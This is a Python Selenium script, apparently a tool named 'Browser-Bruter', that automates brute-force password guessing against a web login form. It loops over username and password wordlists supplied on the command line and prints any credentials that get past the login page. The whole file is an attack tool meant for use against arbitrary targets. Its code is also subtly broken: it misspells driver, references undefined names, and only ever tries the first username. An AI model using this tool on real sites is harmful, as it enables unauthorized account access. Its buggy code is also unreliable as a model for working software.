import time
import argparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager

print("""
██████╗░██████╗░░█████╗░░██╗░░░░░░░██╗░██████╗███████╗██████╗░░░░░░░██████╗░██████╗░██╗░░░██╗████████╗███████╗██████╗░
██╔══██╗██╔══██╗██╔══██╗░██║░░██╗░░██║██╔════╝██╔════╝██╔══██╗░░░░░░██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔══██╗
██████╦╝██████╔╝██║░░██║░╚██╗████╗██╔╝╚█████╗░█████╗░░██████╔╝█████╗██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░██████╔╝
██╔══██╗██╔══██╗██║░░██║░░████╔═████║░░╚═══██╗██╔══╝░░██╔══██╗╚════╝██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔══██╗
██████╦╝██║░░██║╚█████╔╝░░╚██╔╝░╚██╔╝░██████╔╝███████╗██║░░██║░░░░░░██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗██║░░██║
╚═════╝░╚═╝░░╚═╝░╚════╝░░░░╚═╝░░░╚═╝░░╚═════╝░╚══════╝╚═╝░░╚═╝░░░░░░╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝""")

# Parse Command Line Arguments
argParser = argparse.ArgumentParser()
argsRequired = argParser.add_argument_group("required")
argsRequired.add_argument("-t","--target",help="target's url: http://www.jafarpathan.com")
argsRequired.add_argument("-u","--username",help="/path/to/file - for example /tmp/usernames/txt")
argsRequired.add_argument("-p","--password",help="/path/to/file - for example /tmp/passwords.txt")
argsRequired.add_argument("-U","--user-element",help="user element id for example <input id='user'> then -U user")
argsRequired.add_argument("-Ui","--user-element-identifier",help="id, name or class, for example <input id='user'> then -Ui id")
argsRequired.add_argument("-P","--password-element",help="password element id for example <input id='pass'> then -P pass")
argsRequired.add_argument("-Pi","--password-element-identifier",help="id, name or class, for example <input name='pass' then -Pi name")
argsRequired.add_argument("-B","--button-element",help="button element id for example <input type='submit' id='submit'> then -B submit")
argsRequired.add_argument("-Bi","--button-element-identifier",help="id, name or class, for example <button class='btn btn-default'> then -Bi class")
args = argParser.parse_args()

# Launch the browser
options = Options()
options.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()),options=options)
# Go to the target website
driver.get(args.target)

# configure paloads
usernames=[]
with open(args.username, "r") as s:
	for i in s:
		i = i.strip()
		usernames.append(i)
passwords=[]
with open(args.password, "r") as s:
	for i in s:
		i = i.strip()
		passwords.append(i)

# Function to attempt single login
def login_attempt(user,passw):
	get_current_url=driver.current_url

	# Identify username field
	if(args.user_element_identifier == "class"):
		usernameField = dirver.find_element(By.CLASS_NAME,args.user_element)
	else:
		usernameField = driver.find_element(args.user_element_identifier,args.user_element)
	usernameField.clear()
	print("username: "+user)
	usernameField.send_keys(str(user))

	# Identify browser field
	if(args.password_element_identifier == "class"):
		passwordField = driver.find_element(By.CLASSNAME, args.password_element)
	else:
		passwordField = driver.find_element(args.password_element_identifier,args.password_element)
	passwordField.clear()
	print("password: "+passw)
	passwordField.send_keys(str(passw))

	# Identify Button to click
	if(args.button_element_identifier == "class"):
		driver.find_element(By.CLASS_NAME, args.button_element).click()
	else:
		driver.find_element(button_element_identifier,args.button_element).click()
	url_after_clicking_button=driver.current_url
	print("URL: "+url_after_clicking_button)
	if(url_after_clicking_button!=args.target):
		success(user, passw)

	# pause before performing another attempt
	time.sleep(0.3)

# when successfully logged in
def success(u,p):
	print("\n\nCracked it")
	print("Username: " +u+"\nPassword: "+p)
	exit() 

# Perform login attempts for each password in passwords list
for i in range(len(usernames)):
	for j in range(len(passwords)):
		login_attempt(usernames[0],passwords[j])
		j += 1
	i+=i
